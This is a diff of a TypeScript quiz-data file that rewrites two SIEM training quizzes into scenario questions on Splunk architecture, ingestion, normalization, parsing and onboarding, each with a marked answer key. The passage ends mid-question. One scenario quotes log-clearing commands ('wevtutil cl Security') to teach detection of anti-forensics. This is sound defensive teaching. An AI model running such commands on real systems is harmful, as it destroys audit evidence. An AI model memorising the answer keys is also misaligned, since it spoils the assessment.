@@ -1849,1130 +1849,1325 @@ export const quizzes: QuizData[] = [
   {
     quizId: "siem-q1",
     courseId: "siem-fundamentals",
-    title: "SIEM Fundamentals Quiz",
-    description: "Test your understanding of SIEM architecture, components, and basic concepts.",
+    title: "SIEM Architecture & Data Flow",
+    description: "Scenario-based quiz on how a SIEM ingests, parses, and stores telemetry end-to-end.",
     passingScore: 70,
-    timeLimit: 15,
+    timeLimit: 20,
     questions: [
       {
         id: "siem-q1-1",
-        question: "What does SIEM stand for?",
+        difficulty: "easy",
+        tags: ["Architecture", "Splunk"],
+        scenario: "You are drawing the data path for a new Splunk deployment:\n  Endpoints (UF) → ?  → ?  → Analyst's browser\nYour senior asks you to label each tier.",
+        question: "Which ordering of Splunk components correctly represents the path from a forwarded event to an analyst's search result?",
         options: [
-          "Security Intelligence and Event Monitoring",
-          "Security Information and Event Management",
-          "System Integration and Endpoint Management",
-          "Secure Infrastructure and Event Mapping"
+          "Universal Forwarder → Search Head → Indexer → Browser",
+          "Universal Forwarder → Heavy Forwarder/Indexer (parse + store) → Search Head (query + render) → Browser",
+          "Universal Forwarder → Browser → Indexer → Search Head",
+          "Universal Forwarder → Deployment Server → Browser → Indexer"
         ],
         correctAnswer: 1,
-        explanation: "SIEM stands for Security Information and Event Management — a platform that combines log aggregation, real-time monitoring, correlation, and alerting."
+        explanation: "UFs ship raw data to indexers (or a heavy forwarder first), which parse and write tsidx + raw buckets. The search head dispatches SPL to indexers, merges results, and renders them in the browser. (A) inverts indexer/search head. (D) confuses the deployment server (config management) with the data path."
       },
       {
         id: "siem-q1-2",
-        question: "Which component of a SIEM is responsible for collecting and forwarding log data?",
+        difficulty: "medium",
+        tags: ["Ingestion", "Sizing", "EPS"],
+        scenario: "Procurement asks you to size a SIEM license. You measure baseline EPS over a week:\n  Avg EPS: 4,200\n  Peak EPS (business hours): 11,500\n  P95 EPS: 8,800\nVendor licenses are sold in steady-state EPS bands (5k, 10k, 15k).",
+        question: "Which tier should you recommend and why?",
         options: [
-          "Search Head",
-          "Indexer",
-          "Forwarder / Data Collector",
-          "Dashboard Engine"
+          "5k — match the long-term average; bursts are fine.",
+          "10k — size to P95 so steady-state burst headroom is real; peaks can be smoothed by the indexer queue.",
+          "15k — always license to peak.",
+          "5k plus a hard rate-limit at the forwarders to drop excess events."
         ],
-        correctAnswer: 2,
-        explanation: "Forwarders (or data collectors/agents) are deployed on endpoints and network devices to collect and send log data to the SIEM for processing."
+        correctAnswer: 1,
+        explanation: "Sizing to the average under-licenses; sizing to peak over-pays. P95 (10k tier here) is the standard SOC compromise — short bursts above P95 are absorbed by indexer ingestion queues. (D) drops security-relevant data — never acceptable for detection."
       },
       {
         id: "siem-q1-3",
-        question: "What is the primary purpose of a SIEM in a SOC?",
+        difficulty: "medium",
+        tags: ["Normalization", "CIM"],
+        scenario: "Two sources log a failed login differently:\n  Windows 4625:  TargetUserName=jdoe  IpAddress=10.4.2.9  Status=0xC000006A\n  Okta:         {\"actor\":{\"alternateId\":\"[email protected]\"},\"client\":{\"ipAddress\":\"10.4.2.9\"},\"outcome\":{\"result\":\"FAILURE\"}}\nYou want a single correlation rule that fires on N failed logins per user across BOTH sources.",
+        question: "Which approach is correct?",
         options: [
-          "Replace all other security tools",
-          "Centralize log collection, correlation, and alerting for threat detection",
-          "Manage employee access permissions",
-          "Automate patch management"
+          "Write two separate rules, one per source.",
+          "Normalize both into a common schema (CIM/ECS) — e.g. user, src, action, outcome — then write one rule on the normalized fields.",
+          "Strip both down to raw text and grep for 'fail'.",
+          "Forward Okta logs into the Windows index so they share parsers."
         ],
         correctAnswer: 1,
-        explanation: "A SIEM centralizes log data from across the environment, correlates events, and generates alerts to help SOC analysts detect and respond to threats."
+        explanation: "Common Information Model (Splunk CIM) / Elastic Common Schema (ECS) exist precisely for this — map disparate vendor fields to canonical names (user, src, action) at parse time so detections are written once. (A) doubles maintenance. (D) corrupts source typing and breaks parsing."
       },
       {
         id: "siem-q1-4",
-        question: "Which SIEM platform uses SPL (Search Processing Language)?",
+        difficulty: "medium",
+        tags: ["Storage Tiering"],
+        scenario: "Your SIEM has 30 days hot, 90 days warm, 365 days cold. An IR team needs to investigate an incident from 6 months ago.",
+        question: "What is the realistic expectation when querying that data?",
         options: [
-          "Microsoft Sentinel",
-          "IBM QRadar",
-          "Splunk",
-          "Elastic SIEM"
+          "Same speed as a search over the last 24 hours.",
+          "The search will run, but significantly slower — cold buckets must be thawed/rehydrated, and some platforms require an admin-initiated restore.",
+          "The data is permanently gone; no investigation possible.",
+          "The SIEM will automatically promote the data back to hot indefinitely."
         ],
-        correctAnswer: 2,
-        explanation: "Splunk uses SPL (Search Processing Language) as its query language for searching, filtering, and analyzing data."
+        correctAnswer: 1,
+        explanation: "Cold storage trades retrieval latency for cost. Some platforms (e.g. Splunk frozen/S3, Sentinel basic logs) require an explicit restore/search-job before the data is queryable. Plan retention tiers around realistic IR needs."
       },
       {
         id: "siem-q1-5",
-        question: "What query language does Microsoft Sentinel use?",
+        difficulty: "hard",
+        tags: ["Search Performance", "tstats"],
+        scenario: "A nightly Splunk search:\n  index=* sourcetype=* fail* | stats count by user\ntakes 45 minutes and times out. Daily volume is ~2 TB.",
+        question: "Which rewrite gives the biggest, correct performance win?",
         options: [
-          "SPL",
-          "SQL",
-          "KQL (Kusto Query Language)",
-          "AQL"
+          "Add | head 1000 at the end.",
+          "Scope to specific indexes/sourcetypes and use accelerated data models with tstats, e.g. | tstats count from datamodel=Authentication where Authentication.action=failure by Authentication.user",
+          "Remove the time picker so it scans everything.",
+          "Run the same search but at 3 a.m."
         ],
-        correctAnswer: 2,
-        explanation: "Microsoft Sentinel uses KQL (Kusto Query Language) for querying data stored in Azure Log Analytics workspaces."
+        correctAnswer: 1,
+        explanation: "index=* sourcetype=* is the worst possible filter — it forces every bucket to be opened. tstats reads tsidx (indexed metadata) instead of raw events and is often 10–100x faster, especially against an accelerated data model. (A) limits output AFTER the expensive work."
       },
       {
         id: "siem-q1-6",
-        question: "What is the role of an indexer in a SIEM?",
+        difficulty: "medium",
+        tags: ["Correlation", "Detection"],
+        scenario: "You want to detect: 'A user fails to log in ≥10 times within 5 minutes AND then succeeds from the SAME source IP.' (Classic brute-force success.)",
+        question: "Which SIEM capability is required to express this?",
         options: [
-          "Sending alerts to analysts",
-          "Collecting logs from endpoints",
-          "Processing, indexing, and storing incoming data for fast searching",
-          "Displaying dashboards"
+          "A simple keyword alert on 'failed login'.",
+          "Stateful correlation across multiple events with shared join keys (user, src_ip) within a sliding time window.",
+          "A dashboard refresh every 5 minutes.",
+          "A retention policy change."
         ],
-        correctAnswer: 2,
-        explanation: "The indexer receives data from forwarders, parses it, creates indexes for efficient searching, and stores it according to retention policies."
+        correctAnswer: 1,
+        explanation: "This is multi-event, multi-condition correlation: count threshold + follow-on success + shared user/src — exactly what correlation engines (Splunk ES, Sentinel analytics rules, QRadar offenses) exist for. Single keyword alerts cannot express the success-follows-failure relationship."
       },
       {
         id: "siem-q1-7",
-        question: "Which of the following is NOT a common SIEM use case?",
+        difficulty: "medium",
+        tags: ["Log Source Health"],
+        scenario: "Your 'Failed logon brute-force' rule has fired daily for months. For the last 3 days it has fired ZERO times. The SOC manager is happy ('attacks went down'). You are not.",
+        question: "What is the correct first action?",
         options: [
-          "Threat detection and alerting",
-          "Compliance reporting",
-          "Application development",
-          "Incident investigation and forensics"
+          "Celebrate — the rule worked, attackers gave up.",
+          "Check log source health: confirm the underlying Windows Security / auth log feed is still ingesting and parsing correctly. Silence often means a broken pipeline, not safety.",
+          "Lower the threshold to make it fire again.",
+          "Delete the rule — clearly not needed."
         ],
-        correctAnswer: 2,
-        explanation: "Application development is not a SIEM use case. SIEMs are used for threat detection, compliance, incident response, and forensic investigations."
+        correctAnswer: 1,
+        explanation: "Sudden silence on a historically noisy detection is a classic blind-spot indicator: a forwarder died, a parser broke after a Windows update, or a GPO disabled the audit subcategory. Always treat 'too quiet' as a P2 until proven otherwise."
       },
       {
         id: "siem-q1-8",
-        question: "What does 'correlation' mean in SIEM context?",
+        difficulty: "hard",
+        tags: ["Architecture", "Cloud SIEM"],
+        scenario: "Your org is migrating from on-prem Splunk to Microsoft Sentinel. A skeptic claims 'cloud SIEM means we lose all our detections.'",
+        question: "What is the accurate, nuanced response?",
         options: [
-          "Deleting duplicate logs",
-          "Linking related events from different sources to identify patterns or attacks",
-          "Compressing log files",
-          "Sending logs to a backup server"
+          "They're right — start from scratch.",
+          "Detection LOGIC is portable (especially if written in Sigma); the query SYNTAX (SPL → KQL) and data model (CIM → ASIM) require translation, but the analytic intent migrates with effort.",
+          "Cloud SIEMs don't support custom detections at all.",
+          "Just export the SPL files and import them directly into Sentinel."
         ],
         correctAnswer: 1,
-        explanation: "Correlation links related events from multiple data sources to identify attack patterns, suspicious behaviors, or security incidents."
+        explanation: "Sigma-first detection engineering exists for exactly this reason. SPL and KQL are different dialects, and CIM ↔ ASIM field mapping is non-trivial, but the underlying detection IDEAS (impossible travel, LOLBin spawn, etc.) port directly. (D) is false — there is no SPL-to-KQL one-click import."
       },
       {
         id: "siem-q1-9",
-        question: "Which SIEM platform is cloud-native and built on Azure?",
+        difficulty: "easy",
+        tags: ["Ingestion", "Syslog"],
+        scenario: "A network engineer offers two options to ship firewall logs:\n  A) UDP 514 (classic syslog)\n  B) TCP 6514 with TLS\nThe firewalls log auth events used in compliance reporting.",
+        question: "Which do you choose and why?",
         options: [
-          "Splunk Enterprise",
-          "IBM QRadar",
-          "Microsoft Sentinel",
-          "ArcSight"
+          "A — UDP is faster and easier.",
+          "B — TCP guarantees delivery (no silent drops under load) and TLS prevents tampering/sniffing of log content in transit, which matters for compliance evidence.",
+          "Doesn't matter — both are equivalent.",
+          "Neither — use email."
         ],
-        correctAnswer: 2,
-        explanation: "Microsoft Sentinel is a cloud-native SIEM built on Azure, offering scalable log analytics, threat intelligence, and SOAR capabilities."
+        correctAnswer: 1,
+        explanation: "UDP 514 silently drops under congestion and ships plaintext. For security-relevant or compliance data, RFC 5425 syslog-over-TLS (6514) is the standard. Lost auth logs = broken detection AND audit failure."
       },
       {
         id: "siem-q1-10",
-        question: "What is EPS in SIEM licensing?",
+        difficulty: "medium",
+        tags: ["RBAC", "Data Sensitivity"],
+        scenario: "HR forwards Workday audit logs (containing salaries and PII) to the SIEM so insider-threat rules can run. A Tier 1 analyst can currently search those events.",
+        question: "What's the correct control?",
         options: [
-          "Encrypted Protocol Standard",
-          "Events Per Second — a measure of data ingestion rate",
-          "Endpoint Protection Suite",
-          "External Processing Server"
+          "Stop ingesting the data — too risky.",
+          "Ingest into a restricted index/workspace with role-based access; detections run as a service account, raw events are visible only to authorized roles, and field-level masking hides salary values from Tier 1.",
+          "Let everyone see everything — analysts need full context.",
+          "Email the HR data to analysts on request only."
         ],
         correctAnswer: 1,
-        explanation: "EPS (Events Per Second) measures the rate of data ingestion and is commonly used in SIEM licensing models to determine capacity and cost."
+        explanation: "SIEMs support index-level RBAC and field masking precisely for this — the DETECTION needs the data, but the HUMAN doesn't need the raw PII. Restricted index + masked fields + service-account searches = least privilege while preserving detection value."
       },
       {
         id: "siem-q1-11",
-        question: "What is the search head responsible for in Splunk's architecture?",
+        difficulty: "hard",
+        tags: ["Time", "Investigation"],
+        scenario: "During IR, you compare two events from the same incident:\n  Firewall:  2026-06-15 08:14:22 +00:00  deny src=1.2.3.4\n  EDR:       2026-06-15 03:14:47          process.create lsass dump\nYour timeline shows the EDR event 5 hours BEFORE the firewall event, which contradicts the attack story.",
+        question: "Most likely cause and fix?",
         options: [
-          "Collecting logs from endpoints",
-          "Storing raw data",
-          "Processing search queries and presenting results to users",
-          "Forwarding data between indexers"
+          "The attacker time-traveled.",
+          "The EDR is logging in local time (EST) without TZ offset; firewall is UTC. Normalize all event_time to UTC at ingest and enforce TZ-aware parsing in the props/sourcetype config.",
+          "Delete the older event.",
+          "Ignore — timestamps don't matter for IR."
         ],
-        correctAnswer: 2,
-        explanation: "The search head handles search requests from users, distributes them to indexers, merges results, and presents them through the UI."
+        correctAnswer: 1,
+        explanation: "Missing/implicit timezones are one of the top causes of broken IR timelines. Standard practice: every parser converts to UTC, the raw local time is preserved in a separate field for reference, and a 'clock drift' detection alerts when event_time vs ingest_time skews > 60s."
       },
       {
         id: "siem-q1-12",
-        question: "Which query language does IBM QRadar use?",
+        difficulty: "medium",
+        tags: ["Parsing", "Field Extraction"],
+        scenario: "A new SaaS app sends a single unparsed log line:\n  2026-06-15T08:14 LOGIN user=\"jdoe\" result=\"FAIL\" geo=\"IN-Bengaluru\"\nThe SIEM ingests it as one big _raw string. The 'Failed Logins' dashboard shows ZERO events from this app.",
+        question: "Root cause?",
         options: [
-          "SPL",
-          "KQL",
-          "AQL (Ariel Query Language)",
-          "Lucene"
+          "The SIEM is broken.",
+          "No source-type-specific parser/field extraction exists yet — user, result, geo are not extracted as searchable fields, so dashboards filtering on result=FAIL never match.",
+          "The vendor doesn't support failed logins.",
+          "The geo field is wrong."
         ],
-        correctAnswer: 2,
-        explanation: "IBM QRadar uses AQL (Ariel Query Language), a SQL-like language for querying its Ariel database of security events and flows."
+        correctAnswer: 1,
+        explanation: "Field extraction is a prerequisite for everything downstream — search, dashboards, correlation. Add a sourcetype with a KV/regex extractor (or onboarding via an add-on/integration) so the SIEM tokenizes user, result, geo. Until then, the data is invisible to structured queries."
       },
       {
         id: "siem-q1-13",
-        question: "What advantage does a cloud-native SIEM offer over on-premises?",
+        difficulty: "easy",
+        tags: ["Enrichment"],
+        scenario: "Your raw alert shows: 'Failed login from 185.220.101.45 for user admin.' Tier 1 has to swivel-chair to AbuseIPDB, MaxMind, and a Tor exit-node list every time.",
+        question: "Which SIEM capability eliminates this swivel-chair?",
         options: [
-          "Lower data quality",
-          "No internet required",
-          "Elastic scalability and reduced infrastructure management",
-          "Faster local network speeds"
+          "Bigger monitor.",
+          "Automated enrichment at ingest or alert-time: append ASN/GeoIP, threat-intel score, and Tor flag as event fields so the analyst sees them in the alert.",
+          "Block all foreign IPs.",
+          "Disable the rule."
         ],
-        correctAnswer: 2,
-        explanation: "Cloud-native SIEMs offer elastic scalability, reduced infrastructure overhead, automatic updates, and pay-as-you-go pricing models."
+        correctAnswer: 1,
+        explanation: "Enrichment (lookups, asset/identity context, threat-intel) is the single biggest lever for reducing triage time. The analyst's first 30 seconds should answer 'is this IP known-bad?' without leaving the SIEM."
       },
       {
         id: "siem-q1-14",
-        question: "What is 'log normalization'?",
+        difficulty: "hard",
+        tags: ["Detection Engineering", "Sigma"],
+        scenario: "Your team runs Splunk now and is piloting Sentinel. You have 200 detections written in raw SPL.",
+        question: "Which strategy minimizes long-term cost?",
         options: [
-          "Deleting old logs",
-          "Converting logs from different sources into a common format",
-          "Encrypting log data",
-          "Backing up logs to tape"
+          "Maintain 200 SPL rules AND rewrite 200 KQL rules in parallel forever.",
+          "Convert the library to Sigma (vendor-neutral YAML) as source-of-truth; use sigmac/pySigma to emit SPL today and KQL tomorrow. New detections are authored in Sigma first.",
+          "Pick one SIEM and abandon the other.",
+          "Ask the vendor to translate them."
         ],
         correctAnswer: 1,
-        explanation: "Log normalization converts logs from various formats and sources into a standardized schema so they can be consistently searched and correlated."
+        explanation: "Sigma decouples detection LOGIC from vendor SYNTAX. The team writes once, compiles to whichever backend(s) the org runs. This is the standard answer to multi-SIEM, migrations, and vendor lock-in."
       },
       {
         id: "siem-q1-15",
-        question: "Which open-source search engine powers Elastic SIEM?",
+        difficulty: "medium",
+        tags: ["KPI", "SOC Operations"],
+        scenario: "Leadership asks for ONE metric to track SIEM health on the exec dashboard.",
+        question: "Which is most meaningful?",
         options: [
-          "Apache Solr",
-          "Elasticsearch",
-          "MongoDB",
-          "Redis"
+          "Total events ingested per day (bigger = better).",
+          "True-positive rate / alert fidelity, viewed alongside MTTD and MTTR — measures whether the SIEM actually helps detect and respond, not just how much data it consumes.",
+          "Number of dashboards built.",
+          "Splunk license utilization %."
         ],
         correctAnswer: 1,
-        explanation: "Elastic SIEM is built on Elasticsearch, an open-source distributed search and analytics engine optimized for log and event data."
+        explanation: "EPS and dashboard counts are vanity metrics. Alert fidelity (TP / (TP + FP)) plus MTTD/MTTR directly reflect SOC effectiveness — they answer 'are we catching real threats fast?' which is the SIEM's actual job."
       }
     ]
   },
   {
     quizId: "siem-q2",
     courseId: "siem-fundamentals",
-    title: "Data Ingestion Assessment",
-    description: "Evaluate your knowledge of log collection, normalization, and data management.",
-    passingScore: 70,
-    timeLimit: 15,
+    title: "Data Onboarding & Pipeline Engineering",
+    description: "Scenario quiz on bringing new log sources online without breaking detection.",
+    passingScore: 75,
+    timeLimit: 20,
     questions: [
       {
         id: "siem-q2-1",
-        question: "What is the difference between agent-based and agentless log collection?",
+        difficulty: "medium",
+        tags: ["Onboarding", "Change Management"],
+        scenario: "A vendor pushes a parser update for your firewall add-on. After the upgrade, three correlation rules stop firing.",
+        question: "What was the missing pre-deployment step?",
         options: [
-          "There is no difference",
-          "Agent-based installs software on the source; agentless pulls data remotely via protocols like Syslog or WMI",
-          "Agentless is always more reliable",
-          "Agent-based only works on Windows"
+          "Reboot every indexer first.",
+          "Stage the parser change in a dev/test environment, replay representative live data, and validate every dependent detection BEFORE promoting to production.",
+          "Disable all detections during the upgrade.",
+          "Skip the update."
         ],
         correctAnswer: 1,
-        explanation: "Agent-based collection installs a lightweight forwarder on the source system, while agentless collection uses protocols like Syslog, WMI, or APIs to pull data remotely."
+        explanation: "Parser changes silently rename or remove fields (action vs act, src_ip vs srcip). Every onboarding/upgrade needs a dev tier with sample replay AND a regression check of dependent saved searches/rules. Detection engineering = code; treat it with the same CI discipline."
       },
       {
         id: "siem-q2-2",
-        question: "What port does Syslog traditionally use?",
+        difficulty: "easy",
+        tags: ["Agent vs Agentless"],
+        scenario: "You need logs from 5,000 Linux servers running mixed kernels. Some teams refuse to install agents.",
+        question: "Which collection strategy is most pragmatic?",
         options: [
-          "TCP 80",
-          "UDP 514",
-          "TCP 443",
-          "UDP 161"
+          "Force the agent everywhere — no exceptions.",
+          "Hybrid: Universal Forwarder on servers that allow agents (richer collection, file/process visibility); rsyslog → centralized syslog collector for the rest. Document the visibility delta.",
+          "Email logs nightly.",
+          "Skip the holdouts."
         ],
         correctAnswer: 1,
-        explanation: "Syslog traditionally uses UDP port 514 for sending log messages. Modern implementations often use TCP 514 or TCP 6514 (with TLS) for reliability."
+        explanation: "Real environments are hybrid. Agents give you tailing of arbitrary files, metadata, and reliable buffering. Agentless syslog covers political holdouts but is limited to what the OS already emits. Document the gap so detection authors know which hosts CAN'T see Sysmon-equivalent data."
       },
       {
         id: "siem-q2-3",
-        question: "What is field extraction in SIEM data processing?",
+        difficulty: "hard",
+        tags: ["Cost Control", "Tiering"],
+        scenario: "Your hot tier is at 95% and CFO wants 30% cost reduction. Audit shows 60% of ingest is DEBUG-level app logs that NO detection uses. Compliance requires keeping them for 1 year.",
+        question: "Best approach?",
         options: [
-          "Deleting unnecessary fields from logs",
-          "Parsing raw log data to identify and label specific data elements like IP, username, and action",
-          "Exporting fields to a spreadsheet",
-          "Encrypting sensitive fields"
+          "Delete the DEBUG logs entirely.",
+          "Route DEBUG logs to a cheap data-lake tier (S3/ADLS) with cold-search capability; keep security-relevant log levels in the hot SIEM tier. Compliance retention satisfied, hot tier freed.",
+          "Cut all retention to 7 days.",
+          "Move to a cheaper SIEM vendor."
         ],
         correctAnswer: 1,
-        explanation: "Field extraction parses raw log data to identify and label key data elements like IP addresses, usernames, timestamps, and actions for structured searching."
+        explanation: "Tiered architecture (hot SIEM + cold data lake, e.g. Splunk Federated Search, Sentinel Basic Logs, Cribl, Chronicle) is the standard cost-control answer. Detection-relevant data stays fast; compliance/forensics data stays cheap but searchable."
       },
       {
         id: "siem-q2-4",
-        question: "What is a 'source type' in Splunk?",
+        difficulty: "medium",
+        tags: ["AWS", "Cloud Logging"],
+        scenario: "You're onboarding AWS. Available sources:\n  - CloudTrail (control-plane API calls)\n  - VPC Flow Logs (network 5-tuple)\n  - GuardDuty findings\n  - S3 server access logs",
+        question: "Which is the FIRST priority for detection coverage of identity compromise (the #1 cloud risk)?",
         options: [
-          "The physical server generating logs",
-          "A category that defines the format and parsing rules for incoming data",
-          "The user who created the search",
-          "A type of dashboard"
+          "VPC Flow Logs.",
+          "CloudTrail — every IAM action (AssumeRole, CreateUser, console login, key creation) lands here; without it you cannot detect credential abuse.",
+          "S3 server access logs.",
+          "GuardDuty alone."
         ],
         correctAnswer: 1,
-        explanation: "A source type in Splunk categorizes data by format, telling Splunk how to parse and extract fields from that specific log type."
+        explanation: "CloudTrail is the audit log of AWS. Identity-based attacks (compromised access keys, role assumption chains, persistence via new IAM users) are invisible without it. VPC Flow and S3 access are valuable but secondary. GuardDuty is signal, not raw evidence."
       },
       {
         id: "siem-q2-5",
-        question: "What is 'hot/warm/cold' storage in SIEM data management?",
+        difficulty: "medium",
+        tags: ["Tamper Resistance"],
+        scenario: "An attacker with local admin on a Windows server runs:\n  wevtutil cl Security\n  wevtutil cl System\nThey then continue lateral movement.",
+        question: "Why does your investigation still succeed?",
         options: [
-          "Temperature monitoring of servers",
-          "Tiered storage where recent data is fast-access and older data moves to slower, cheaper storage",
-          "Types of encryption",
-          "Network speed tiers"
+          "Windows refuses to clear the logs.",
+          "Logs were forwarded to the SIEM in near-real-time before the clear; the central copy is on infrastructure the attacker has no privilege on. Event ID 1102 (audit log cleared) is itself a high-fidelity detection.",
+          "wevtutil doesn't actually delete logs.",
+          "The attacker's clear command is automatically rolled back."
         ],
         correctAnswer: 1,
-        explanation: "Hot/warm/cold storage tiers balance performance and cost: hot for recent, frequently accessed data; warm for less frequent; cold for archival and compliance."
+        explanation: "This is the entire reason we ship logs OFF the endpoint. Local logs are at the attacker's mercy; centralized SIEM copies are not. Event 1102 / 4 (log cleared) is also one of the strongest 'someone is hiding tracks' signals — alert on it with high severity."
       },
       {
         id: "siem-q2-6",
-        question: "Why is timestamp normalization important in SIEM?",
+        difficulty: "hard",
+        tags: ["Schema Drift", "Detection Reliability"],
+        scenario: "A vendor renames a field across all events:\n  user_name → userName\nYour 47 detections referencing user_name silently stop matching. No alerts. No errors.",
+        question: "What engineering practice prevents this?",
         options: [
-          "It makes logs look prettier",
-          "It ensures events from different time zones can be accurately correlated chronologically",
-          "It reduces storage costs",
-          "It speeds up network traffic"
+          "Hope the vendor doesn't rename things.",
+          "Schema/field contract tests: scheduled validators that assert critical fields exist and have non-null cardinality. Alert on drift. Combine with a normalization layer so detections reference canonical names, not vendor names.",
+          "Manually re-check every rule weekly.",
+          "Stop using that vendor."
         ],
         correctAnswer: 1,
-        explanation: "Timestamp normalization ensures events from systems in different time zones are aligned to a common reference (usually UTC) for accurate correlation."
+        explanation: "Silent schema drift is one of the top causes of broken detection. Mitigations: (1) normalize to CIM/ECS so detections reference stable canonical fields, (2) automated 'field exists and is populated' health checks, (3) detection unit tests in CI."
       },
       {
         id: "siem-q2-7",
-        question: "What is a Universal Forwarder in Splunk?",
+        difficulty: "medium",
+        tags: ["EDR Integration"],
+        scenario: "You onboard CrowdStrike via FDR (Falcon Data Replicator) into the SIEM. After two weeks, indexers are at 90% disk. EDR alone is 4 TB/day — half your total ingest.",
+        question: "Smartest tuning approach?",
         options: [
-          "A full Splunk instance on every endpoint",
-          "A lightweight agent that collects and forwards data to indexers with minimal resource usage",
-          "A cloud-based storage service",
-          "A type of dashboard"
+          "Stop ingesting EDR.",
+          "Filter at the source/forwarder: drop low-value DNS resolutions and high-volume innocuous process telemetry that you don't use in any detection, while preserving Sysmon-equivalent EIDs you DO use. Document every drop.",
+          "Buy more disk forever.",
+          "Sample randomly — drop 50% of events."
         ],
         correctAnswer: 1,
-        explanation: "A Universal Forwarder is a lightweight Splunk agent designed to collect and forward data to indexers while consuming minimal CPU and memory."
+        explanation: "Edge filtering (Cribl, Splunk ingest actions, Logstash) is the right scalpel. Random sampling (D) breaks correlation. The discipline: every drop rule is reviewed by detection engineering AND logged in a 'what we don't ingest' register so future authors aren't blindsided."
       },
       {
         id: "siem-q2-8",
-        question: "What does CEF stand for in log formatting?",
+        difficulty: "easy",
+        tags: ["CEF", "Standards"],
+        scenario: "Three vendors ship logs in CEF (Common Event Format).",
+        question: "Why does CEF matter to a SIEM team?",
         options: [
-          "Common Encryption Framework",
-          "Central Event Filter",
-          "Common Event Format",
-          "Centralized Extraction Function"
+          "It's a vendor lock-in trap.",
+          "CEF defines a predictable header + key=value structure, so a single parser handles many vendors with minimal per-vendor work, and fields normalize cleanly to CIM/ASIM.",
+          "CEF is encrypted.",
+          "CEF is required by GDPR."
         ],
-        correctAnswer: 2,
-        explanation: "CEF (Common Event Format) is a standardized log format developed by ArcSight that provides a common structure for security event data across vendors."
+        correctAnswer: 1,
+        explanation: "CEF (and LEEF for QRadar) reduces onboarding cost dramatically — predictable structure means write-once parsers and consistent field naming. It's the closest the industry has to a 'common security log dialect.'"
       },
       {
         id: "siem-q2-9",
-        question: "Which data collection method is best for cloud services like AWS or Azure?",
+        difficulty: "hard",
+        tags: ["Pipeline", "Cribl/Edge Routing"],
+        scenario: "You introduce an observability pipeline (Cribl) between sources and your SIEM. The architect proposes routing FULL fidelity to a cold lake and only HIGH-VALUE events to the hot SIEM.",
+        question: "Main risk and how to mitigate?",
         options: [
-          "Syslog over UDP",
-          "Physical serial connection",
-          "API-based integration",
-          "Manual log upload"
+          "No risk — ship it.",
+          "Risk: a detection-relevant event is dropped from the hot path and never alerts. Mitigation: keep an authoritative inventory of detection-required fields/events, version the routing rules, and run a 'detection coverage diff' before any routing change reaches production.",
+          "Risk: Cribl is too fast.",
+          "Risk: the cold lake costs more than hot."
         ],
-        correctAnswer: 2,
-        explanation: "API-based integration is ideal for cloud services, using REST APIs to pull logs from platforms like AWS CloudTrail, Azure Activity Logs, or Office 365."
+        correctAnswer: 1,
+        explanation: "Pipelines are powerful but become a hidden detection layer. Treat routing rules as code: PR review, change diff vs the detection library, dev-tier replay, and a rollback plan. Otherwise a 'cost optimization' silently kills alerts."
       },
       {
         id: "siem-q2-10",
-        question: "What is data enrichment in SIEM?",
+        difficulty: "medium",
+        tags: ["Identity"],
+        scenario: "Onboarding Azure AD sign-in logs. The detection team wants to write 'impossible travel' and 'risky sign-in' rules.",
+        question: "Which Azure AD log streams are required at minimum?",
         options: [
-          "Compressing data for storage",
-          "Adding context to events such as geolocation, threat intelligence, or asset information",
-          "Deleting duplicate events",
-          "Converting data to JSON format"
+          "Only Audit logs.",
+          "SigninLogs (interactive + non-interactive), plus IdentityRiskEvents for ID Protection signals; Audit logs for directory changes used in privilege-escalation detections.",
+          "Only the activity log.",
+          "Only Defender alerts."
         ],
         correctAnswer: 1,
-        explanation: "Data enrichment adds contextual information to raw events — like geolocation for IPs, threat intel scores, or asset criticality — improving analysis."
+        explanation: "SigninLogs carry the who/where/how of authentication; non-interactive sign-ins are where token replay and refresh-token abuse hide. IdentityRiskEvents add Microsoft's risk scoring. Audit logs cover the persistence side (new app registrations, role assignments)."
       },
       {
         id: "siem-q2-11",
-        question: "What is the purpose of data retention policies in SIEM?",
+        difficulty: "medium",
+        tags: ["Lookups", "Asset Context"],
+        scenario: "Alerts say 'login from 10.4.7.22'. Analysts have no idea if that's a printer, a domain controller, or a CFO laptop.",
+        question: "What's the standard fix?",
         options: [
-          "To keep all data forever",
-          "To define how long different types of data are stored based on compliance and operational needs",
-          "To delete data immediately after collection",
-          "To encrypt stored data"
+          "Make analysts memorize the IP plan.",
+          "Maintain an asset/identity lookup (CMDB → SIEM lookup table) keyed on IP/hostname and enrich every alert with owner, criticality, environment, and OS at search-time.",
+          "Stop using internal IPs.",
+          "Ignore internal source IPs."
         ],
         correctAnswer: 1,
-        explanation: "Retention policies define storage durations for different data types, balancing compliance requirements, operational needs, and storage costs."
+        explanation: "Asset context turns a noisy alert into a prioritizable one. Splunk ES Asset & Identity Framework, Sentinel Watchlists, QRadar Reference Data — every mature SIEM has this. Refresh the lookup nightly from the CMDB."
       },
       {
         id: "siem-q2-12",
-        question: "What protocol provides reliable, encrypted syslog delivery?",
+        difficulty: "hard",
+        tags: ["Late-Arriving Data"],
+        scenario: "A cloud connector batches events and delivers them 45 minutes late. Your near-real-time correlation rule (5-minute window) NEVER fires on these events even when the pattern is clearly present.",
+        question: "Root cause and correct redesign?",
         options: [
-          "UDP Syslog",
-          "SNMP",
-          "Syslog over TLS (TCP 6514)",
-          "FTP"
+          "The rule is wrong; rewrite the logic.",
+          "Real-time correlation windows operate on INGEST time but the events are stamped with EVENT time 45 min in the past — they fall outside the live window. Redesign: switch to a scheduled batch search over a window that accounts for ingest latency, or use the platform's late-arrival/event-time correlation mode.",
+          "Increase the rule severity.",
+          "Drop the late-arriving source."
         ],
-        correctAnswer: 2,
-        explanation: "Syslog over TLS (typically on TCP port 6514) provides both reliable delivery (TCP) and encryption (TLS) for secure log transmission."
+        correctAnswer: 1,
+        explanation: "Event-time vs ingest-time is a classic gotcha. Real-time stream correlation can't see the past. For lagged sources, use scheduled/batch detections with a window that brackets typical lag (e.g. last 60 min, every 10 min) or platform features like Sentinel's near-real-time analytics with appropriate lookback."
       },
       {
         id: "siem-q2-13",
-        question: "What is an index in SIEM data storage?",
+        difficulty: "medium",
+        tags: ["DNS"],
+        scenario: "You're choosing what DNS telemetry to onboard. Options: (a) DNS server query logs, (b) endpoint DNS (Sysmon EID 22 / EDR), (c) passive DNS at the resolver.",
+        question: "For detecting C2 beacons and DGA traffic from a single endpoint, what's the highest-fidelity source?",
         options: [
-          "A table of contents for documentation",
-          "A structured repository where processed and searchable event data is stored",
-          "A list of all SIEM users",
-          "A backup location"
+          "Resolver passive DNS only — aggregated org-wide.",
